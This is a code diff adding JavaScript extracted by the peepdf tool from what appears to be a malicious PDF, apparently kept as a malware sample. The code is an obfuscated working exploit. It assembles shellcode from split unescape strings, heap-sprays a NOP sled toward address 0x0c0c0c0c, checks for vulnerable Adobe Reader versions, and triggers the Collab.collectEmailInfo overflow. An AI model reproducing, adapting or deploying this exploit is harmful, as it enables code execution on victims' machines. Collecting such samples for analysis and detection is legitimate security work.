@@ -1,0 +1,48 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.ROf5Uw8()
+
+// peepdf comment: Javascript code located in object 12 (version 0)
+
+function ROf5Uw8() {
+    var YP6vr6QorT = new Array();
+
+    function xbVxb(ssiEB, rrkO2vrPyuTj8) {
+        while (ssiEB.length * 2 < rrkO2vrPyuTj8) {
+            ssiEB += ssiEB;
+        }
+        ssiEB = ssiEB.substring(0, rrkO2vrPyuTj8 / 2);
+        return ssiEB;
+    }
+
+    function aZi1rAMnrRebk() {
+        var nOxiv = 0x0c0c0c0c;
+        var Bfx65Z = unescape("%uC" + "1DA%uC" + "9" + "31%u5" + "" + "EB1%u7" + "4" + "D9%uF4" + "24%u39" + "BF%uDC4F%u5AE9" + "%u7A" + "31%u0317%u177A%uFB83%u3E4B%u101C%uE443%uD595" + "%u7EAD%u2593%uFF2F%u5FD7%u1DB6%uB4ED%u09CD%uB5F9" + "%u3631%u058E%u5057%u56F6%u5B9A%uC1A0%u05FC%u28A0" + "%u276B%u4F2C%u5AA" + "0%uDE77%u1BDB%u0A95%u897E%u4D74" + "%u3460%u43EC%uF084%u016B%uD458%u6F01%u1528%uA7D7" + "%u0FC3%u5572%u24F6%u0E70%uD036%uDD49%uE526%u0770" + "%u7B17%u4CA0%u43D7%u7" + "59F%u1005%uA632%u0297%u1068" + "%uA890%u0AD5%u3230%uDBF7%u13A3%u41" + "" + "7D%uF399%uEE06" + "%u5C84%u89E5%u0" + "" + "623%uCA1B%uD941%u5301%u37F1%u987F" + "%uF7" + "60%u970E%u6102%u3D69%u066A%u8E41%uE8F2%uD333" + "%uB5E9%u4B48%u47CD%uF20B%u3E57%u5B49%u8EE2%u7AB1" + "%u0955%u1FA2%u8580%u1823%uACA8%uB4EA%uBD88%u72B4" + "%u8C74%uDCB2%u8AE4%u18F8%u57A1%u055C%u3A54%u4980" + "%uDCF0%uE8E9%u16CA%uC527%uCE04%uBC76%u4A84%uF44E" + "%u9ACF%uC139%uED76%u7BD7%uC42F%u22" + "3B%u463C%u1F8C" + "%u4D73%uD46A%u924F%u9141%uB938%u3FFF%u02B6%uD999" + "%uA35E%uC89A%uB056%uE" + "895%uBAB1%uE7A7%uAFBE%u6EB2" + "%uCCE0%u5AAE%uC7FD%uA6DC%uCA0A%uBDEF%u0F0F%uB7E2" + "%u101B%uAE25%u2112%u0C21%u3E4B%u3534%u5E" + "50%uA839" + "%u50A4%uCE" + "51%u6ECF%uFB3F%u69C6%uD6BD%u71D7%u20D5" + "%u66FC%u49F2%u8CEF%u9DF6%uA506%u9160%u9F2C%uDF4E" + "%uD75D%uE984%uE55A%uE3AA%uE644%uF7C0%u9EA3%u7343" + "%uD120%u54A9%u26E7%u84" + "F6%u7DC6%uF63F%u4811%u3711" + "%u9B55%u4F17%uCCFA%uDA88%u3C88%u4C" + "27%uC101");
+        var kH7HyyF = 0x400000;
+        var ImX0DMpr4Z4 = Bfx65Z.length * 2;
+        var rrkO2vrPyuTj8 = kH7HyyF - (ImX0DMpr4Z4 + 0x38);
+        var ssiEB = unescape("%u9" + "090%u9" + "090");
+        ssiEB = xbVxb(ssiEB, rrkO2vrPyuTj8);
+        var i3Nn37w3OI = (nOxiv - 0x400000) / kH7HyyF;
+        for (var ufpy = 0; ufpy < i3Nn37w3OI; ufpy++) {
+            YP6vr6QorT[ufpy] = ssiEB + Bfx65Z;
+        }
+    }
+
+    function ytxTVgb() {
+        var ryfky8 = app.viewerVersion.toString();
+        ryfky8 = ryfky8.replace(/\D/g, '');
+        var XGKxJ = new Array(ryfky8.charAt(0), ryfky8.charAt(1), ryfky8.charAt(2));
+        if ((XGKxJ[0] == 8 && ((XGKxJ[1] == 1 && XGKxJ[2] < 2) || XGKxJ[1] < 1)) || (XGKxJ[0] == 7 && XGKxJ[1] < 1) || (XGKxJ[0] < 7)) {
+            aZi1rAMnrRebk();
+            var DUDT = unescape("%u0c0c%u0c0c");
+            while (DUDT.length < 44952) DUDT += DUDT;
+            this.collabStore = Collab.collectEmailInfo({
+                subj: "",
+                msg: DUDT
+            });
+        }
+    }
+    ytxTVgb();
+}
+
